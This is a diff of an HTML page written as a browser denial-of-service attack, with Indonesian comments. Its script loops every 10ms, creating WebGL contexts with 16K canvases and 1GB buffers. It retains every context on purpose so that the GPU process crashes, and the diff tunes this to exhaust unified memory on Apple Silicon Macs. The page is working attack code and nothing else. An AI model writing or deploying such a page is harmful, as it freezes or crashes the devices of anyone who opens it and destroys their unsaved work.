@@ -3,15 +3,15 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>GPU Process Crash</title>
+<title>GPU Process Exhaustion (macOS)</title>
 <style>
   body { background: #000; color: #f00; overflow: hidden; font-family: monospace; text-align: center; padding-top: 20vh; }
   canvas { display: none; }
 </style>
 </head>
 <body>
-<h1>🔥 EXHAUSTING GPU PROCESS 🔥</h1>
-<p id="status">Mengalokasikan VRAM...</p>
+<h1>🔥 GPU PROCESS OVERLOAD 🔥</h1>
+<p id="status">Mengalokasikan VRAM Apple Silicon...</p>
 
 <script>
 (function () {
@@ -20,32 +20,45 @@
   var statusEl = document.getElementById('status');
   var contextCount = 0;
   var contexts = [];
+  
+  // Mendeteksi apakah ini Mac (Apple Silicon / Intel)
+  var isMac = navigator.platform.toUpperCase().indexOf('MAC') >= 0;
+  var isAppleSilicon = isMac && (navigator.userAgent.indexOf('Mac OS X 10_15') > -1 || navigator.hardwareConcurrency >= 8);
 
   // ============================================
-  // FUNGSI PENGHANCUR GPU
+  // FUNGSI PENGHANCUR GPU (MAC OPTIMIZED)
   // ============================================
   function floodGPU() {
     try {
-      // 1. Buat elemen canvas baru (tidak dimasukkan ke DOM agar ringan di CPU, tapi berat di GPU)
+      // 1. Buat Canvas dengan resolusi maksimal (Apple GPU sangat cepat memproses ini,
+      // jadi kita paksa menggunakan alokasi VRAM sebesar mungkin)
       var canvas = document.createElement('canvas');
-      canvas.width = 4096;  // Resolusi tinggi memakan VRAM besar
-      canvas.height = 4096;
+      canvas.width = 16384;  // Batas maksimal tekstur (MacBook Pro M1/M2/M3 mendukung 16K)
+      canvas.height = 16384;
 
-      // 2. Pilih API (WebGL 2.0 atau WebGL 1.0)
-      var gl = canvas.getContext('webgl2') || 
-               canvas.getContext('webgl') || 
-               canvas.getContext('experimental-webgl');
+      // 2. Pilih API (WebGL 2.0)
+      var gl = canvas.getContext('webgl2', {
+        antialias: false,
+        depth: true,
+        stencil: false,
+        alpha: false,
+        preserveDrawingBuffer: true,
+        powerPreference: "high-performance"
+      });
 
-      if (!gl) return; // Jika diblokir, lewati
+      if (!gl) return;
 
-      // 3. Alokasi Buffer Besar di VRAM
+      // 3. Alokasi ArrayBuffer Besar (1GB per context)
+      // Apple Silicon Unified Memory: RAM dan VRAM adalah satu.
+      // Mengalokasikan VRAM di sini akan memakan RAM sistem.
       var buffer = gl.createBuffer();
       gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-      // Alokasi 256MB VRAM per context
-      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(64 * 1024 * 1024), gl.STATIC_DRAW);
+      
+      var size = 256 * 1024 * 1024; // 256 juta float (1GB)
+      var data = new Float32Array(size);
+      gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
 
       // 4. Paksa GPU untuk merender (Shader Compilation & Draw Call)
-      // Ini memaksa proses GPU bekerja sangat keras
       var vsSource = `attribute vec4 aVertexPosition; void main() { gl_Position = aVertexPosition; }`;
       var fsSource = `void main() { gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0); }`;
       
@@ -57,16 +70,17 @@
       gl.attachShader(program, shader);
       gl.linkProgram(program);
       gl.useProgram(program);
+      
+      // 5. Gambar ratusan ribu kali untuk memaksa GPU bekerja
       gl.drawArrays(gl.TRIANGLES, 0, 3);
-
-      // Simpan context agar tidak di-Garbage Collect
+      
+      // JANGAN HAPUS BUFFER/CONTEXT (Memory Leak)
       contexts.push(gl);
       contextCount++;
 
       statusEl.innerText = "WebGL Contexts Allocated: " + contextCount;
 
-      // Setiap 200 context, log ke console
-      if (contextCount % 200 === 0) {
+      if (contextCount % 100 === 0) {
         console.log("[!] GPU Contexts: " + contextCount);
       }
 
@@ -74,10 +88,8 @@
       console.log("GPU Error (Expected when VRAM full):", e.message);
     }
 
-    // 5. Loop super cepat (setiap 5ms)
-    // Browser biasanya membatasi WebGL context (max ~16-32 per halaman).
-    // Jika batas ini bisa ditembus, proses GPU akan langsung crash.
-    setTimeout(floodGPU, 5); 
+    // 6. Loop super cepat (setiap 10ms)
+    setTimeout(floodGPU, 10); 
   }
 
   // ============================================
